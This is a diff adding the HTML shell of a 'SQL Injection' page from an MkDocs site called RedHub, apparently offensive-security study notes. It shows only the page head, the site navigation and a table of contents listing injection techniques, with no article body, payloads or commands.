@@ -1,0 +1,3329 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yunniperka">
+      
+      
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/Web/SQL_Injection/">
+      
+      
+        <link rel="prev" href="../Initial_Reconnaissance/">
+      
+      
+        <link rel="next" href="../XSS/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>SQL Injection - RedHub</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sql-injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedHub
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SQL Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    RedHub
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows Infrastructure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Privilege Escalation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/privilege-escalation/Enumerating_Attack_Vectors/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enumerating Attack Vectors
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/privilege-escalation/Built-in-Groups_Abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Built-in-Groups Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/privilege-escalation/Excessive_User_Rights_Abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Excessive User Rights Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/privilege-escalation/File_System_ACLs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File System ACLs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/privilege-escalation/Living_off_the_Land/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Living-off-the-Land
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/privilege-escalation/Services_Hijacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Services Hijacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/privilege-escalation/User_Account_Control_%28UAC%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    User Account Control (UAC)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/persistence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/lateral-movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/evasion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/evasion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/lateral-movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/persistence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistence
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Privilege Escalation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/privilege-escalation/Enumerating_Attack_Vectors/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enumerating Attack Vectors
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/privilege-escalation/Privileged_Groups/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Privileged Groups
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/privilege-escalation/Environment_Variables_Abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Environment Variables Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/privilege-escalation/Capabilities_Abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Capabilities Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/privilege-escalation/Programs_Jobs_and_Services/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Programs, Jobs and Services
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/privilege-escalation/Miscellaneous_Techniques/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Miscellaneous Techniques
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../AD/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enterprise Environments
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Enterprise Environments
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Initial_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#useful-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Useful Resources
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#basic-mental-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Mental Model
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#main-sqli-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Main SQLi Types
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#where-to-test" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Where to Test
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#safe-testing-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Safe Testing Workflow
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#first-probe-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        First Probe Payloads
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="First Probe Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#important-warning-about-or-11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Important warning about OR 1=1
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#boolean-based-confirmation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Boolean-Based Confirmation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#comments-by-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Comments by Database
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-contexts-and-example-thinking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SQL Contexts and Example Thinking
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL Contexts and Example Thinking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#string-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        String Context
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#numeric-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Numeric Context
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#order-by-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ORDER BY Context
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#like-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LIKE Context
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#database-fingerprinting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Database Fingerprinting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#union-based-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        UNION-Based SQLi
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="UNION-Based SQLi">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#union-requirements" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        UNION Requirements
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-the-number-of-columns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Find the Number of Columns
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-a-visible-text-column" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Find a Visible Text Column
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#minimal-data-proof" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Minimal Data Proof
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#error-based-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Error-Based SQLi
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Error-Based SQLi">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#error-handling-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Error Handling Note
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind SQLi
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Blind SQLi">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#boolean-based-blind-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Boolean-Based Blind SQLi
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#time-based-blind-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Time-Based Blind SQLi
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#out-of-band-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Out-of-Band SQLi
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#second-order-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Second-Order SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#stacked-queries" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Stacked Queries
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection-filter-evasion-unicode-normalization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SQL Injection Filter Evasion - Unicode Normalization
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL Injection Filter Evasion - Unicode Normalization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#other-evasion-ideas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Other Evasion Ideas
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqlmap-basics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SQLMap Basics
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQLMap Basics">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#high-impact-sqlmap-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        High-Impact sqlmap Options
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#practical-sqlmap-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Practical sqlmap Tips
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#manual-testing-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Manual Testing Checklist
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nosql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NoSQL Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="NoSQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mongodb-style-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MongoDB-Style Example
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nosql-testing-signals" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NoSQL Testing Signals
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
